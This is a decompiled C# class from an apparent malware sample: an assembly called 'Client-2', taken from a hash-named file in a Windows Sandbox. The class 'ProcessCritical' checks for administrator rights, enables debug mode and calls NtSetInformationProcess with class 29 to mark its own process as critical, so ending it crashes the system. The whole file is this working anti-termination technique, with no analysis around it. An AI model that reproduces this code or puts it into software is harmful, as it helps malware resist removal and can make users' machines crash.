// Decompiled with JetBrains decompiler
// Type: Complex.ProcessCritical
// Assembly: Client-2, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 10231E92-BCE6-4007-A463-67D77912E754
// Assembly location: C:\Users\WDAGUtilityAccount\Desktop\5d40615701c48a122e44f831e7c8643d07765629a83b15d090587f469c77693d

using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Security.Principal;

namespace Complex
{
  public static class ProcessCritical
  {
    [DllImport("ntdll.dll", SetLastError = true)]
    private static extern int NtSetInformationProcess(
      IntPtr hProcess,
      int processInformationClass,
      ref int processInformation,
      int processInformationLength);

    public static void ProtectMyProcess()
    {
      if (!ProcessCritical.IsAdmin())
        return;
      ProcessCritical.YesItIs();
    }

    public static void YesItIs()
    {
      int processInformation = 1;
      int processInformationClass = 29;
      Process.EnterDebugMode();
      ProcessCritical.NtSetInformationProcess(Process.GetCurrentProcess().Handle, processInformationClass, ref processInformation, 4);
    }

    public static bool IsAdmin() => new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator);
  }
}
